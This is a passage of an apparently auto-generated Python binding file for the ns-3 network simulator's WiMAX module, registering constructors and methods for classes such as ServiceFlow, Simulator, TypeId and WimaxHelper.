'void',
[])
cls.add_method('ResetInvitedRangingRetries',
'void',
[])
cls.add_method('ResetRangingCorrectionRetries',
'void',
[])
cls.add_method('SetAreServiceFlowsAllocated',
'void',
[param('bool', 'val')])
cls.add_method('SetBasicCid',
'void',
[param('ns3::Cid', 'basicCid')])
cls.add_method('SetDsaRsp',
'void',
[param('ns3::DsaRsp', 'dsaRsp')])
cls.add_method('SetDsaRspRetries',
'void',
[param('uint8_t', 'dsaRspRetries')])
cls.add_method('SetIPAddress',
'void',
[param('ns3::Ipv4Address', 'IPaddress')])
cls.add_method('SetIsBroadcastSS',
'void',
[param('bool', 'arg0')])
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'macAddress')])
cls.add_method('SetModulationType',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetPollMeBit',
'void',
[param('bool', 'pollMeBit')])
cls.add_method('SetPrimaryCid',
'void',
[param('ns3::Cid', 'primaryCid')])
cls.add_method('SetRangingStatus',
'void',
[param('ns3::WimaxNetDevice::RangingStatus', 'rangingStatus')])
cls.add_method('SetSfTransactionId',
'void',
[param('uint16_t', 'sfTransactionId')])
return
def register_Ns3SeedManager_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SeedManager const &', 'arg0')])
cls.add_method('CheckSeed',
'bool',
[param('uint32_t', 'seed')],
is_static=True)
cls.add_method('GetRun',
'uint32_t',
[],
is_static=True)
cls.add_method('GetSeed',
'uint32_t',
[],
is_static=True)
cls.add_method('SetRun',
'void',
[param('uint32_t', 'run')],
is_static=True)
cls.add_method('SetSeed',
'void',
[param('uint32_t', 'seed')],
is_static=True)
return
def register_Ns3SendParams_methods(root_module, cls):
cls.add_constructor([param('ns3::SendParams const &', 'arg0')])
cls.add_constructor([])
return
def register_Ns3SequentialVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::SequentialVariable const &', 'arg0')])
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('double', 'i', default_value='1'), param('uint32_t', 'c', default_value='1')])
cls.add_constructor([param('double', 'f'), param('double', 'l'), param('ns3::RandomVariable const &', 'i'), param('uint32_t', 'c', default_value='1')])
return
def register_Ns3ServiceFlow_methods(root_module, cls):
cls.add_constructor([param('ns3::Tlv', 'tlv')])
cls.add_constructor([param('ns3::ServiceFlow::Direction', 'direction')])
cls.add_constructor([])
cls.add_constructor([param('ns3::ServiceFlow const &', 'sf')])
cls.add_constructor([param('uint32_t', 'sfid'), param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])
cls.add_method('CheckClassifierMatch',
'bool',
[param('ns3::Ipv4Address', 'srcAddress'), param('ns3::Ipv4Address', 'dstAddress'), param('uint16_t', 'srcPort'), param('uint16_t', 'dstPort'), param('uint8_t', 'proto')],
is_const=True)
cls.add_method('CleanUpQueue',
'void',
[])
cls.add_method('CopyParametersFrom',
'void',
[param('ns3::ServiceFlow', 'sf')])
cls.add_method('GetArqBlockLifeTime',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqBlockSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqDeliverInOrder',
'uint8_t',
[],
is_const=True)
cls.add_method('GetArqEnable',
'uint8_t',
[],
is_const=True)
cls.add_method('GetArqPurgeTimeout',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqRetryTimeoutRx',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqRetryTimeoutTx',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqSyncLoss',
'uint16_t',
[],
is_const=True)
cls.add_method('GetArqWindowSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetCid',
'uint16_t',
[],
is_const=True)
cls.add_method('GetConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('GetConvergenceSublayerParam',
'ns3::CsParameters',
[],
is_const=True)
cls.add_method('GetCsSpecification',
'ns3::ServiceFlow::CsSpecification',
[],
is_const=True)
cls.add_method('GetDirection',
'ns3::ServiceFlow::Direction',
[],
is_const=True)
cls.add_method('GetFixedversusVariableSduIndicator',
'uint8_t',
[],
is_const=True)
cls.add_method('GetIsEnabled',
'bool',
[],
is_const=True)
cls.add_method('GetIsMulticast',
'bool',
[],
is_const=True)
cls.add_method('GetMaxSustainedTrafficRate',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMaxTrafficBurst',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMaximumLatency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMinReservedTrafficRate',
'uint32_t',
[],
is_const=True)
cls.add_method('GetMinTolerableTrafficRate',
'uint32_t',
[],
is_const=True)
cls.add_method('GetModulation',
'ns3::WimaxPhy::ModulationType',
[],
is_const=True)
cls.add_method('GetQosParamSetType',
'uint8_t',
[],
is_const=True)
cls.add_method('GetQueue',
'ns3::Ptr< ns3::WimaxMacQueue >',
[],
is_const=True)
cls.add_method('GetRecord',
'ns3::ServiceFlowRecord *',
[],
is_const=True)
cls.add_method('GetRequestTransmissionPolicy',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSchedulingType',
'ns3::ServiceFlow::SchedulingType',
[],
is_const=True)
cls.add_method('GetSchedulingTypeStr',
'char *',
[],
is_const=True)
cls.add_method('GetSduSize',
'uint8_t',
[],
is_const=True)
cls.add_method('GetServiceClassName',
'std::string',
[],
is_const=True)
cls.add_method('GetServiceSchedulingType',
'ns3::ServiceFlow::SchedulingType',
[],
is_const=True)
cls.add_method('GetSfid',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTargetSAID',
'uint16_t',
[],
is_const=True)
cls.add_method('GetToleratedJitter',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTrafficPriority',
'uint8_t',
[],
is_const=True)
cls.add_method('GetType',
'ns3::ServiceFlow::Type',
[],
is_const=True)
cls.add_method('GetUnsolicitedGrantInterval',
'uint16_t',
[],
is_const=True)
cls.add_method('GetUnsolicitedPollingInterval',
'uint16_t',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[],
is_const=True)
cls.add_method('HasPackets',
'bool',
[param('ns3::MacHeaderType::HeaderType', 'packetType')],
is_const=True)
cls.add_method('InitValues',
'void',
[])
cls.add_method('PrintQoSParameters',
'void',
[],
is_const=True)
cls.add_method('SetArqBlockLifeTime',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqBlockSize',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqDeliverInOrder',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetArqEnable',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetArqPurgeTimeout',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqRetryTimeoutRx',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqRetryTimeoutTx',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqSyncLoss',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqWindowSize',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetConnection',
'void',
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])
cls.add_method('SetConvergenceSublayerParam',
'void',
[param('ns3::CsParameters', 'arg0')])
cls.add_method('SetCsSpecification',
'void',
[param('ns3::ServiceFlow::CsSpecification', 'arg0')])
cls.add_method('SetDirection',
'void',
[param('ns3::ServiceFlow::Direction', 'direction')])
cls.add_method('SetFixedversusVariableSduIndicator',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetIsEnabled',
'void',
[param('bool', 'isEnabled')])
cls.add_method('SetIsMulticast',
'void',
[param('bool', 'isMulticast')])
cls.add_method('SetMaxSustainedTrafficRate',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMaxTrafficBurst',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMaximumLatency',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMinReservedTrafficRate',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMinTolerableTrafficRate',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetModulation',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetQosParamSetType',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetRecord',
'void',
[param('ns3::ServiceFlowRecord *', 'record')])
cls.add_method('SetRequestTransmissionPolicy',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetSduSize',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetServiceClassName',
'void',
[param('std::string', 'arg0')])
cls.add_method('SetServiceSchedulingType',
'void',
[param('ns3::ServiceFlow::SchedulingType', 'arg0')])
cls.add_method('SetSfid',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetTargetSAID',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetToleratedJitter',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetTrafficPriority',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetType',
'void',
[param('ns3::ServiceFlow::Type', 'type')])
cls.add_method('SetUnsolicitedGrantInterval',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetUnsolicitedPollingInterval',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('ToTlv',
'ns3::Tlv',
[],
is_const=True)
return
def register_Ns3ServiceFlowRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::ServiceFlowRecord const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBacklogged',
'uint32_t',
[],
is_const=True)
cls.add_method('GetBackloggedTemp',
'uint32_t',
[],
is_const=True)
cls.add_method('GetBwSinceLastExpiry',
'uint32_t',
[])
cls.add_method('GetBytesRcvd',
'uint32_t',
[],
is_const=True)
cls.add_method('GetBytesSent',
'uint32_t',
[],
is_const=True)
cls.add_method('GetDlTimeStamp',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetGrantSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetGrantTimeStamp',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetGrantedBandwidth',
'uint32_t',
[])
cls.add_method('GetGrantedBandwidthTemp',
'uint32_t',
[])
cls.add_method('GetLastGrantTime',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetPktsRcvd',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPktsSent',
'uint32_t',
[],
is_const=True)
cls.add_method('GetRequestedBandwidth',
'uint32_t',
[])
cls.add_method('IncreaseBacklogged',
'void',
[param('uint32_t', 'backlogged')])
cls.add_method('IncreaseBackloggedTemp',
'void',
[param('uint32_t', 'backloggedTemp')])
cls.add_method('SetBacklogged',
'void',
[param('uint32_t', 'backlogged')])
cls.add_method('SetBackloggedTemp',
'void',
[param('uint32_t', 'backloggedTemp')])
cls.add_method('SetBwSinceLastExpiry',
'void',
[param('uint32_t', 'bwSinceLastExpiry')])
cls.add_method('SetBytesRcvd',
'void',
[param('uint32_t', 'bytesRcvd')])
cls.add_method('SetBytesSent',
'void',
[param('uint32_t', 'bytesSent')])
cls.add_method('SetDlTimeStamp',
'void',
[param('ns3::Time', 'dlTimeStamp')])
cls.add_method('SetGrantSize',
'void',
[param('uint32_t', 'grantSize')])
cls.add_method('SetGrantTimeStamp',
'void',
[param('ns3::Time', 'grantTimeStamp')])
cls.add_method('SetGrantedBandwidth',
'void',
[param('uint32_t', 'grantedBandwidth')])
cls.add_method('SetGrantedBandwidthTemp',
'void',
[param('uint32_t', 'grantedBandwidthTemp')])
cls.add_method('SetLastGrantTime',
'void',
[param('ns3::Time', 'grantTime')])
cls.add_method('SetPktsRcvd',
'void',
[param('uint32_t', 'pktsRcvd')])
cls.add_method('SetPktsSent',
'void',
[param('uint32_t', 'pktsSent')])
cls.add_method('SetRequestedBandwidth',
'void',
[param('uint32_t', 'requestedBandwidth')])
cls.add_method('UpdateBwSinceLastExpiry',
'void',
[param('uint32_t', 'bwSinceLastExpiry')])
cls.add_method('UpdateBytesRcvd',
'void',
[param('uint32_t', 'bytesRcvd')])
cls.add_method('UpdateBytesSent',
'void',
[param('uint32_t', 'bytesSent')])
cls.add_method('UpdateGrantedBandwidth',
'void',
[param('uint32_t', 'grantedBandwidth')])
cls.add_method('UpdateGrantedBandwidthTemp',
'void',
[param('uint32_t', 'grantedBandwidthTemp')])
cls.add_method('UpdatePktsRcvd',
'void',
[param('uint32_t', 'pktsRcvd')])
cls.add_method('UpdatePktsSent',
'void',
[param('uint32_t', 'pktsSent')])
cls.add_method('UpdateRequestedBandwidth',
'void',
[param('uint32_t', 'requestedBandwidth')])
return
def register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3Simulator_methods(root_module, cls):
cls.add_constructor([param('ns3::Simulator const &', 'arg0')])
cls.add_method('Cancel',
'void',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('Destroy',
'void',
[],
is_static=True)
cls.add_method('GetContext',
'uint32_t',
[],
is_static=True)
cls.add_method('GetDelayLeft',
'ns3::Time',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('GetImplementation',
'ns3::Ptr< ns3::SimulatorImpl >',
[],
is_static=True)
cls.add_method('GetMaximumSimulationTime',
'ns3::Time',
[],
is_static=True)
cls.add_method('GetSystemId',
'uint32_t',
[],
is_static=True)
cls.add_method('IsExpired',
'bool',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('IsFinished',
'bool',
[],
is_static=True)
cls.add_method('Next',
'ns3::Time',
[],
is_static=True, deprecated=True)
cls.add_method('Now',
'ns3::Time',
[],
is_static=True)
cls.add_method('Remove',
'void',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('RunOneEvent',
'void',
[],
is_static=True, deprecated=True)
cls.add_method('SetImplementation',
'void',
[param('ns3::Ptr< ns3::SimulatorImpl >', 'impl')],
is_static=True)
cls.add_method('SetScheduler',
'void',
[param('ns3::ObjectFactory', 'schedulerFactory')],
is_static=True)
cls.add_method('Stop',
'void',
[],
is_static=True)
cls.add_method('Stop',
'void',
[param('ns3::Time const &', 'time')],
is_static=True)
return
def register_Ns3Tag_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Tag const &', 'arg0')])
cls.add_method('Deserialize',
'void',
[param('ns3::TagBuffer', 'i')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::TagBuffer', 'i')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3TagBuffer_methods(root_module, cls):
cls.add_constructor([param('ns3::TagBuffer const &', 'arg0')])
cls.add_constructor([param('uint8_t *', 'start'), param('uint8_t *', 'end')])
cls.add_method('CopyFrom',
'void',
[param('ns3::TagBuffer', 'o')])
cls.add_method('Read',
'void',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('ReadDouble',
'double',
[])
cls.add_method('ReadU16',
'uint16_t',
[])
cls.add_method('ReadU32',
'uint32_t',
[])
cls.add_method('ReadU64',
'uint64_t',
[])
cls.add_method('ReadU8',
'uint8_t',
[])
cls.add_method('TrimAtEnd',
'void',
[param('uint32_t', 'trim')])
cls.add_method('Write',
'void',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('WriteDouble',
'void',
[param('double', 'v')])
cls.add_method('WriteU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteU64',
'void',
[param('uint64_t', 'v')])
cls.add_method('WriteU8',
'void',
[param('uint8_t', 'v')])
return
def register_Ns3TlvValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TlvValue const &', 'arg0')])
cls.add_method('Copy',
'ns3::TlvValue *',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3TosTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::TosTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'arg0'), param('uint8_t', 'arg1'), param('uint8_t', 'arg2')])
cls.add_method('Copy',
'ns3::TosTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('GetHigh',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLow',
'uint8_t',
[],
is_const=True)
cls.add_method('GetMask',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3TriangularVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::TriangularVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 's'), param('double', 'l'), param('double', 'mean')])
return
def register_Ns3TypeId_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('char const *', 'name')])
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeId const &', 'o')])
cls.add_method('AddAttribute',
'ns3::TypeId',
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])
cls.add_method('AddAttribute',
'ns3::TypeId',
[param('std::string', 'name'), param('std::string', 'help'), param('uint32_t', 'flags'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])
cls.add_method('AddTraceSource',
'ns3::TypeId',
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::Ptr< ns3::TraceSourceAccessor const >', 'accessor')])
cls.add_method('GetAttribute',
'ns3::TypeId::AttributeInformation',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetAttributeFullName',
'std::string',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetAttributeN',
'uint32_t',
[],
is_const=True)
cls.add_method('GetConstructor',
'ns3::Callback< ns3::ObjectBase *, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',
[],
is_const=True)
cls.add_method('GetGroupName',
'std::string',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetParent',
'ns3::TypeId',
[],
is_const=True)
cls.add_method('GetRegistered',
'ns3::TypeId',
[param('uint32_t', 'i')],
is_static=True)
cls.add_method('GetRegisteredN',
'uint32_t',
[],
is_static=True)
cls.add_method('GetTraceSource',
'ns3::TypeId::TraceSourceInformation',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetTraceSourceN',
'uint32_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint16_t',
[],
is_const=True)
cls.add_method('HasConstructor',
'bool',
[],
is_const=True)
cls.add_method('HasParent',
'bool',
[],
is_const=True)
cls.add_method('HideFromDocumentation',
'ns3::TypeId',
[])
cls.add_method('IsChildOf',
'bool',
[param('ns3::TypeId', 'other')],
is_const=True)
cls.add_method('LookupAttributeByName',
'bool',
[param('std::string', 'name'), param('ns3::TypeId::AttributeInformation *', 'info')],
is_const=True)
cls.add_method('LookupByName',
'ns3::TypeId',
[param('std::string', 'name')],
is_static=True)
cls.add_method('LookupTraceSourceByName',
'ns3::Ptr< ns3::TraceSourceAccessor const >',
[param('std::string', 'name')],
is_const=True)
cls.add_method('MustHideFromDocumentation',
'bool',
[],
is_const=True)
cls.add_method('SetAttributeInitialValue',
'bool',
[param('uint32_t', 'i'), param('ns3::Ptr< ns3::AttributeValue const >', 'initialValue')])
cls.add_method('SetGroupName',
'ns3::TypeId',
[param('std::string', 'groupName')])
cls.add_method('SetParent',
'ns3::TypeId',
[param('ns3::TypeId', 'tid')])
cls.add_method('SetUid',
'void',
[param('uint16_t', 'tid')])
return
def register_Ns3TypeIdAttributeInformation_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeId::AttributeInformation const &', 'arg0')])
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::AttributeAccessor const >', is_const=False)
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)
cls.add_instance_attribute('flags', 'uint32_t', is_const=False)
cls.add_instance_attribute('help', 'std::string', is_const=False)
cls.add_instance_attribute('initialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)
cls.add_instance_attribute('name', 'std::string', is_const=False)
cls.add_instance_attribute('originalInitialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)
return
def register_Ns3TypeIdTraceSourceInformation_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeId::TraceSourceInformation const &', 'arg0')])
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::TraceSourceAccessor const >', is_const=False)
cls.add_instance_attribute('help', 'std::string', is_const=False)
cls.add_instance_attribute('name', 'std::string', is_const=False)
return
def register_Ns3U16TlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::U16TlvValue const &', 'arg0')])
cls.add_constructor([param('uint16_t', 'value')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::U16TlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetValue',
'uint16_t',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3U32TlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::U32TlvValue const &', 'arg0')])
cls.add_constructor([param('uint32_t', 'value')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::U32TlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetValue',
'uint32_t',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3U8TlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::U8TlvValue const &', 'arg0')])
cls.add_constructor([param('uint8_t', 'value')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::U8TlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetValue',
'uint8_t',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3UcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::UcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBwReqOppSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetFrequency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetRangReqOppSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetBwReqOppSize',
'void',
[param('uint16_t', 'bwReqOppSize')])
cls.add_method('SetFrequency',
'void',
[param('uint32_t', 'frequency')])
cls.add_method('SetRangReqOppSize',
'void',
[param('uint16_t', 'rangReqOppSize')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3UniformVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::UniformVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 's'), param('double', 'l')])
cls.add_method('GetInteger',
'uint32_t',
[param('uint32_t', 's'), param('uint32_t', 'l')])
cls.add_method('GetValue',
'double',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[param('double', 's'), param('double', 'l')])
return
def register_Ns3VectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::VectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('ns3::Tlv const &', 'val')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::VectorTlvValue *',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3WeibullVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::WeibullVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm')])
cls.add_constructor([param('double', 'm'), param('double', 's')])
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])
return
def register_Ns3WimaxHelper_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxHelper const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateBSScheduler',
'ns3::Ptr< ns3::BSScheduler >',
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('CreatePhy',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType')])
cls.add_method('CreatePhy',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])
cls.add_method('CreatePhyWithoutChannel',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType')])
cls.add_method('CreatePhyWithoutChannel',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])
cls.add_method('CreateServiceFlow',
'ns3::ServiceFlow',
[param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::ServiceFlow::SchedulingType', 'schedulinType'), param('ns3::IpcsClassifierRecord', 'classifier')])
cls.add_method('CreateUplinkScheduler',
'ns3::Ptr< ns3::UplinkScheduler >',
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('EnableAsciiForConnection',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'oss'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('char *', 'netdevice'), param('char *', 'connection')],
is_static=True)
cls.add_method('EnableLogComponents',
'void',
[],
is_static=True)
cls.add_method('Install',
'ns3::NetDeviceContainer',
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'type'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('Install',
'ns3::NetDeviceContainer',
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('Install',
'ns3::NetDeviceContainer',
